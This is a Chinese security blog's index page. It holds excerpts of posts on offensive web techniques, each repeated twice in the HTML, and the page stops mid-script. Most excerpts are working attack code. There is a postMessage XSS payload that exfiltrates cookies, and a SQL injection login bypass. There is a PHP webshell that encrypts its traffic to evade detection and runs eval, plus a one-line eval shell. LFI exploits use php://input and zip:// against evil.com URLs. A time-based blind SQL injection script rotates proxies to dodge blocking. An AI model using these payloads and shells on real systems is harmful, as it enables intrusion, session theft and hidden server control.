&lt;http:&#x2F;&#x2F;en.citizendium.org&#x2F;wiki&#x2F;Stack_frame&gt;
虽然是英文，但是看起来要比中文易懂<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ida里面有三种颜色的箭头:</p>
<ol>
<li>蓝色，顺序执行</li>
<li>绿色，条件为(YES)</li>
<li>红色，条件为（NO）</li>
</ol>
	
	</div>
  <a type="button" href="/2017/02/02/mac-re.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/01/07/n0js-case-postMessage-xss.html" >n0js case3</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-01-07  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<ul>
<li><a target="_blank" rel="noopener" href="https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002">https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002</a></li>
<li><a target="_blank" rel="noopener" href="http://server.n0tr00t.com/n0js/case3.php">http://server.n0tr00t.com/n0js/case3.php</a></li>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html">https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html</a></li>
</ul>
<p>在不同网页之间使用postMessage交流信息的时候，存在xss的情况，上面第二个链接是问题，第一个和第三个是对应的解决方法，最后的payload就是如下：</p>
<p>简单来说，如果A存在xss，B使用postMessage接收来自A的信息，那么在A站可以加载B的iframe，弹出B的cookie。所以这种情况下，A，B都是存在Xss漏洞的。</p>
<pre class="line-numbers language-none"><code class="language-none">var t &#x3D; document.createElement(&quot;iframe&quot;);
t.setAttribute(&quot;src&quot;,&quot;https:&#x2F;&#x2F;www.n0tr00t.com&#x2F;static&#x2F;test&#x2F;helloevent.html&quot;);
&#x2F;&#x2F;t.setAttribute(&quot;onload&quot;,&quot;frames[0].postMessage(&#39;&lt;input onfocus&#x3D;alert(document.cookie) autofocus&gt;&#39;,&#39;*&#39;)&quot;);
document.body.appendChild(t);

function a()&#123;
var b &#x3D; document.createElement(&quot;button&quot;);
b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;&lt;img src&#x3D;x onerror&#x3D;alert(document.cookie)&gt;&#39;,&#39;*&#39;)&quot;);
&#x2F;&#x2F;b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;this is onerror img src&#39;,&#39;*&#39;)&quot;);
document.body.appendChild(b);
b.click();
&#125;
&#x2F;&#x2F;setTimeout(&quot;a()&quot;,3000);
window.onload &#x3D; a();
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/01/07/n0js-case-postMessage-xss.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<ul>
<li><a target="_blank" rel="noopener" href="https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002">https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002</a></li>
<li><a target="_blank" rel="noopener" href="http://server.n0tr00t.com/n0js/case3.php">http://server.n0tr00t.com/n0js/case3.php</a></li>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html">https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html</a></li>
</ul>
<p>在不同网页之间使用postMessage交流信息的时候，存在xss的情况，上面第二个链接是问题，第一个和第三个是对应的解决方法，最后的payload就是如下：</p>
<p>简单来说，如果A存在xss，B使用postMessage接收来自A的信息，那么在A站可以加载B的iframe，弹出B的cookie。所以这种情况下，A，B都是存在Xss漏洞的。</p>
<pre class="line-numbers language-none"><code class="language-none">var t &#x3D; document.createElement(&quot;iframe&quot;);
t.setAttribute(&quot;src&quot;,&quot;https:&#x2F;&#x2F;www.n0tr00t.com&#x2F;static&#x2F;test&#x2F;helloevent.html&quot;);
&#x2F;&#x2F;t.setAttribute(&quot;onload&quot;,&quot;frames[0].postMessage(&#39;&lt;input onfocus&#x3D;alert(document.cookie) autofocus&gt;&#39;,&#39;*&#39;)&quot;);
document.body.appendChild(t);

function a()&#123;
var b &#x3D; document.createElement(&quot;button&quot;);
b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;&lt;img src&#x3D;x onerror&#x3D;alert(document.cookie)&gt;&#39;,&#39;*&#39;)&quot;);
&#x2F;&#x2F;b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;this is onerror img src&#39;,&#39;*&#39;)&quot;);
document.body.appendChild(b);
b.click();
&#125;
&#x2F;&#x2F;setTimeout(&quot;a()&quot;,3000);
window.onload &#x3D; a();
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/01/07/n0js-case-postMessage-xss.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/01/05/SQL隐形转换绕过waf.html" >SQL隐形弱类型转换绕过</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-01-05  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://tom.vg/2013/04/mysql-implicit-type-conversion/">https://tom.vg/2013/04/mysql-implicit-type-conversion/</a><br><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-24308.html">https://www.t00ls.net/articles-24308.html</a></p>
<p>如果PHP语句中存在这样的登录漏洞比如：</p>
<p><code>$sql=&quot;select * from users where id=&#39;&quot;.$user.&quot;&#39; and password=&#39;&quot;.md5($pass).&quot;&#39;;</code></p>
<p>但是在登录框处限制了用户名长度</p>
<pre class="line-numbers language-none"><code class="language-none">if (strlen($user)&gt;4)&#123;
print &quot;用户名不能超过4个字符串&quot;;
echo $user;
echo strlen($user);
die();
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果未做限制的情况下可以构造这样的语句<br><code>select * from users where userid = 1 or 1=1</code></p>
<p>在限制的情况下可以利用sql隐形转换这样子：<br><code>select * from users where userid=&#39;&#39;=0#</code></p>
<p>这个就全部选择出来了，然后重要的点在后面<code>userid=&#39;&#39;=0#</code>，闭合前面单引号，于是整个数值就恒等于了，也可以这么写</p>
<p><code>userid=&#39;&#39;=false#</code>,<code>userid=&#39;&#39;=(1-1)</code>,<code>userid=&#39;a&#39;=0</code></p>
<p>基本原理就是上面文章提到的：</p>
	

	</div>
  <a type="button" href="/2017/01/05/SQL隐形转换绕过waf.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://tom.vg/2013/04/mysql-implicit-type-conversion/">https://tom.vg/2013/04/mysql-implicit-type-conversion/</a><br><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-24308.html">https://www.t00ls.net/articles-24308.html</a></p>
<p>如果PHP语句中存在这样的登录漏洞比如：</p>
<p><code>$sql=&quot;select * from users where id=&#39;&quot;.$user.&quot;&#39; and password=&#39;&quot;.md5($pass).&quot;&#39;;</code></p>
<p>但是在登录框处限制了用户名长度</p>
<pre class="line-numbers language-none"><code class="language-none">if (strlen($user)&gt;4)&#123;
print &quot;用户名不能超过4个字符串&quot;;
echo $user;
echo strlen($user);
die();
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果未做限制的情况下可以构造这样的语句<br><code>select * from users where userid = 1 or 1=1</code></p>
<p>在限制的情况下可以利用sql隐形转换这样子：<br><code>select * from users where userid=&#39;&#39;=0#</code></p>
<p>这个就全部选择出来了，然后重要的点在后面<code>userid=&#39;&#39;=0#</code>，闭合前面单引号，于是整个数值就恒等于了，也可以这么写</p>
<p><code>userid=&#39;&#39;=false#</code>,<code>userid=&#39;&#39;=(1-1)</code>,<code>userid=&#39;a&#39;=0</code></p>
<p>基本原理就是上面文章提到的：</p>
	
	</div>
  <a type="button" href="/2017/01/05/SQL隐形转换绕过waf.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/01/04/加密webshell流量.html" >加密webshell流量</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-01-04  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-none"><code class="language-none">&lt;?php
function easy_en($str) &#123;
    $ret &#x3D; &quot;&quot;;
    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
        $old &#x3D; ord($str[$i]);
        if ($old &#x3D;&#x3D; 0) $new &#x3D; 0x7f;
        else $new &#x3D; $old -1;
        $ret .&#x3D; chr($new);
    &#125;
    return $ret;
&#125;

function easy_de($str) &#123;
    $ret &#x3D; &quot;&quot;;
    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
        $old &#x3D; ord($str[$i]);
        if ($old &#x3D;&#x3D; 0x7f) $new &#x3D; 0;
        else $new &#x3D; $old + 1;
        $ret .&#x3D; chr($new);
    &#125;
    return $ret;
&#125;

if (@$_GET[&#39;role&#39;] &#x3D;&#x3D; &#39;proxy&#39; &amp;&amp; @$_GET[&#39;url&#39;]) &#123;
    $c &#x3D; base64_encode(easy_en(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
&#x2F;&#x2F;    var_dump($c);
    $cxt &#x3D; stream_context_create(array(&#39;http&#39;&#x3D;&gt;array(
        &#39;header&#39;&#x3D;&gt;&#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39;,
        &#39;method&#39;&#x3D;&gt;&#39;POST&#39;,
        &#39;content&#39;&#x3D;&gt;$c),
    ));
    $c &#x3D; file_get_contents($_GET[&#39;url&#39;], false, $cxt);
&#x2F;&#x2F;    var_dump($c);
    die(easy_de(base64_decode($c)));
&#125;

function shutdown() &#123;
    $str &#x3D; ob_get_contents();
    ob_end_clean();
    echo base64_encode(easy_en($str));
&#125;

register_shutdown_function(&quot;shutdown&quot;);
ob_start();
$c &#x3D; easy_de(base64_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
parse_str($c, $_POST); &#x2F;&#x2F;解密之后把pass赋值给$_POST参数
eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
?&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/01/04/加密webshell流量.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-none"><code class="language-none">&lt;?php
function easy_en($str) &#123;
    $ret &#x3D; &quot;&quot;;
    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
        $old &#x3D; ord($str[$i]);
        if ($old &#x3D;&#x3D; 0) $new &#x3D; 0x7f;
        else $new &#x3D; $old -1;
        $ret .&#x3D; chr($new);
    &#125;
    return $ret;
&#125;

function easy_de($str) &#123;
    $ret &#x3D; &quot;&quot;;
    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
        $old &#x3D; ord($str[$i]);
        if ($old &#x3D;&#x3D; 0x7f) $new &#x3D; 0;
        else $new &#x3D; $old + 1;
        $ret .&#x3D; chr($new);
    &#125;
    return $ret;
&#125;

if (@$_GET[&#39;role&#39;] &#x3D;&#x3D; &#39;proxy&#39; &amp;&amp; @$_GET[&#39;url&#39;]) &#123;
    $c &#x3D; base64_encode(easy_en(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
&#x2F;&#x2F;    var_dump($c);
    $cxt &#x3D; stream_context_create(array(&#39;http&#39;&#x3D;&gt;array(
        &#39;header&#39;&#x3D;&gt;&#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39;,
        &#39;method&#39;&#x3D;&gt;&#39;POST&#39;,
        &#39;content&#39;&#x3D;&gt;$c),
    ));
    $c &#x3D; file_get_contents($_GET[&#39;url&#39;], false, $cxt);
&#x2F;&#x2F;    var_dump($c);
    die(easy_de(base64_decode($c)));
&#125;

function shutdown() &#123;
    $str &#x3D; ob_get_contents();
    ob_end_clean();
    echo base64_encode(easy_en($str));
&#125;

register_shutdown_function(&quot;shutdown&quot;);
ob_start();
$c &#x3D; easy_de(base64_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
parse_str($c, $_POST); &#x2F;&#x2F;解密之后把pass赋值给$_POST参数
eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
?&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/01/04/加密webshell流量.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/01/03/sql中转.html" >Sqlmap备忘录</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-01-03  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>2017-1-11更新：<br>原来的时候下面这一坨代码用了半个小时写出来，PHP比较渣，变查边写边用burp调试。</p>
<p>其实需求很简单，就是在sqlmap的每个payload后面写入特定字符，昨天的时候看到这篇文章才发现sqlmap已经有选项了，感觉自己蠢蠢嗒- -</p>
<p><a target="_blank" rel="noopener" href="http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html">http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html</a></p>
<blockquote>
<p>The prefix (–prefix) and suffix (–suffix) options configure the strings that should be included with each SQL injection payload in order to begin, and then terminate, the Injection. </p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">--prefix --suffix 是每次添加在payload的数据，一个前置，一个后置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>###在注入测试的时候union查询用的是NULL?</p>
<blockquote>
<p>Why use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates.</p>
</blockquote>
<p>###使用具体的payload<br>如果知道了注入点是在order by，可以添加这样的选项:<code>--test-filter=&#39;ORDER BY&#39;</code></p>
<p>###<code>--string</code> &amp; <code>--not-string</code><br>Blind injection的时候，有这样的选项：</p>
<pre class="line-numbers language-none"><code class="language-none">--string
--not-string
在true或者false要判断的字符

--regexp 使用的正则表达
--code 根据HTTP状态来判断
--text-only 比较回应的文本
--title 比较回应的title

其中作者说明了使用--string或者--not-string的时候可以使用Python里面的十六进制换行来匹配比如newline(\x0a)和tabs(\x09)

--string&#x3D;&quot;Name\x0a\x09\x09Stephen&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/01/03/sql中转.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>2017-1-11更新：<br>原来的时候下面这一坨代码用了半个小时写出来，PHP比较渣，变查边写边用burp调试。</p>
<p>其实需求很简单，就是在sqlmap的每个payload后面写入特定字符，昨天的时候看到这篇文章才发现sqlmap已经有选项了，感觉自己蠢蠢嗒- -</p>
<p><a target="_blank" rel="noopener" href="http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html">http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html</a></p>
<blockquote>
<p>The prefix (–prefix) and suffix (–suffix) options configure the strings that should be included with each SQL injection payload in order to begin, and then terminate, the Injection. </p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">--prefix --suffix 是每次添加在payload的数据，一个前置，一个后置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>###在注入测试的时候union查询用的是NULL?</p>
<blockquote>
<p>Why use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates.</p>
</blockquote>
<p>###使用具体的payload<br>如果知道了注入点是在order by，可以添加这样的选项:<code>--test-filter=&#39;ORDER BY&#39;</code></p>
<p>###<code>--string</code> &amp; <code>--not-string</code><br>Blind injection的时候，有这样的选项：</p>
<pre class="line-numbers language-none"><code class="language-none">--string
--not-string
在true或者false要判断的字符

--regexp 使用的正则表达
--code 根据HTTP状态来判断
--text-only 比较回应的文本
--title 比较回应的title

其中作者说明了使用--string或者--not-string的时候可以使用Python里面的十六进制换行来匹配比如newline(\x0a)和tabs(\x09)

--string&#x3D;&quot;Name\x0a\x09\x09Stephen&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/01/03/sql中转.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/12/28/php的zip伪协议.html" >php://input&amp;&amp;php://filter</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-12-28  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>php://input需要服务器的支持，同时要求”allow_url_include”设置为On，在PHP的配置文件php.ini配置。对于一个LFI产生的漏洞比如：</p>
<pre class="line-numbers language-none"><code class="language-none">index.php:

&lt;?php
    $b&#x3D;$_REQUEST[&quot;b&quot;];
    @include($b);
 ?&gt;
 
EXP:

GET http:&#x2F;&#x2F;evil.com&#x2F;index.php?php:&#x2F;&#x2F;input
&lt;?php system(&quot;id&quot;)?&gt;

获取文件内容：
&lt;?php echo file_get_contents(&quot;info.php&quot;);?&gt; &#x2F;&#x2F;测试可用
&lt;?php echo base64_encode(file_get_contents(&quot;info.php&quot;));?&gt;  &#x2F;&#x2F;http:&#x2F;&#x2F;www.cnblogs.com&#x2F;LittleHann&#x2F;p&#x2F;3665062.html 防止获取&#96;.php&#96;文件的时候php执行，先base64编码下，但是实际测试上述即可用。php在4点多的版本使用这个可以读出来


fimap.py 类似sqlmap.py，用来文件包含扫描，可以获取一个交互shell
另外一个php伪协议：
 
file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;image.php
用来读取php文件。
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>$_FILES[“file”][“type”]</code><br>这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改Content-Type: image/jpeg 就可以绕过这个检查，上传任意类型的文件。</p>
<h3 id="php的zip伪协议"><a href="#php的zip伪协议" class="headerlink" title="php的zip伪协议"></a>php的zip伪协议</h3><p>假设有以下的代码：</p>
<pre class="line-numbers language-none"><code class="language-none">file.php:

&lt;?php
@include($_GET[&#39;a&#39;].&quot;.jpg&quot;);
@include($_GET[&#39;b&#39;].&quot;.php&quot;);

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>明细的包含，对于参数a和参数b可以这样来解决，比如有一个</p>
<pre class="line-numbers language-none"><code class="language-none">shell.php:

&lt;?php eval($_GET[&#39;c&#39;]);?&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>a参数最终包含的是一个jpg，b参数是一个php</p>
<pre class="line-numbers language-none"><code class="language-none">对于a来说：
mv shell.php shell.jpg
zip a.zip shell.jpg

访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?a&#x3D;zip:&#x2F;&#x2F;a.zip%23shell&amp;c&#x3D;phpinfo();

对于b来说：
zip b.zip shell.php

访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?b&#x3D;zip:&#x2F;&#x2F;b.zip%23shell&amp;c&#x3D;phpinfo();
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2016/12/28/php的zip伪协议.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>php://input需要服务器的支持，同时要求”allow_url_include”设置为On，在PHP的配置文件php.ini配置。对于一个LFI产生的漏洞比如：</p>
<pre class="line-numbers language-none"><code class="language-none">index.php:

&lt;?php
    $b&#x3D;$_REQUEST[&quot;b&quot;];
    @include($b);
 ?&gt;
 
EXP:

GET http:&#x2F;&#x2F;evil.com&#x2F;index.php?php:&#x2F;&#x2F;input
&lt;?php system(&quot;id&quot;)?&gt;

获取文件内容：
&lt;?php echo file_get_contents(&quot;info.php&quot;);?&gt; &#x2F;&#x2F;测试可用
&lt;?php echo base64_encode(file_get_contents(&quot;info.php&quot;));?&gt;  &#x2F;&#x2F;http:&#x2F;&#x2F;www.cnblogs.com&#x2F;LittleHann&#x2F;p&#x2F;3665062.html 防止获取&#96;.php&#96;文件的时候php执行，先base64编码下，但是实际测试上述即可用。php在4点多的版本使用这个可以读出来


fimap.py 类似sqlmap.py，用来文件包含扫描，可以获取一个交互shell
另外一个php伪协议：
 
file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;image.php
用来读取php文件。
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>$_FILES[“file”][“type”]</code><br>这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改Content-Type: image/jpeg 就可以绕过这个检查，上传任意类型的文件。</p>
<h3 id="php的zip伪协议"><a href="#php的zip伪协议" class="headerlink" title="php的zip伪协议"></a>php的zip伪协议</h3><p>假设有以下的代码：</p>
<pre class="line-numbers language-none"><code class="language-none">file.php:

&lt;?php
@include($_GET[&#39;a&#39;].&quot;.jpg&quot;);
@include($_GET[&#39;b&#39;].&quot;.php&quot;);

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>明细的包含，对于参数a和参数b可以这样来解决，比如有一个</p>
<pre class="line-numbers language-none"><code class="language-none">shell.php:

&lt;?php eval($_GET[&#39;c&#39;]);?&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>a参数最终包含的是一个jpg，b参数是一个php</p>
<pre class="line-numbers language-none"><code class="language-none">对于a来说：
mv shell.php shell.jpg
zip a.zip shell.jpg

访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?a&#x3D;zip:&#x2F;&#x2F;a.zip%23shell&amp;c&#x3D;phpinfo();

对于b来说：
zip b.zip shell.php

访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?b&#x3D;zip:&#x2F;&#x2F;b.zip%23shell&amp;c&#x3D;phpinfo();
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2016/12/28/php的zip伪协议.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/11/08/sql-proxy.html" >Sql代理注入</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-11-08  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># coding: utf-8</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

target <span class="token operator">=</span> <span class="token string">'http://www.vulnerable.com'</span>
headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"www.vulnerable.com"</span><span class="token punctuation">,</span>
	<span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"</span> <span class="token punctuation">,</span>
	<span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span>
	<span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3"</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"f4udpabdluoed7ldhfp90"</span><span class="token punctuation">&#125;</span>
	payload <span class="token operator">=</span> <span class="token string">"1' or select if(length(user())=&#123;&#125;,sleep(15),1) or '1'='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
	data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"userpwd"</span><span class="token punctuation">:</span> <span class="token string">"abc"</span><span class="token punctuation">&#125;</span>

	<span class="token keyword">def</span> <span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
			r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:1111/time&lt;4"</span><span class="token punctuation">)</span>
			proxy <span class="token operator">=</span> r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"[\"]"</span><span class="token punctuation">)</span>
			ab <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token keyword">try</span><span class="token punctuation">:</span>
				test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.vulnerable.com"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
				<span class="token keyword">if</span> test<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
					<span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> ab<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy
			<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
				<span class="token keyword">pass</span>

	<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
		testtime<span class="token punctuation">,</span> proxy <span class="token operator">=</span> val<span class="token punctuation">(</span><span class="token punctuation">)</span>
		now <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">try</span><span class="token punctuation">:</span>
			req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>
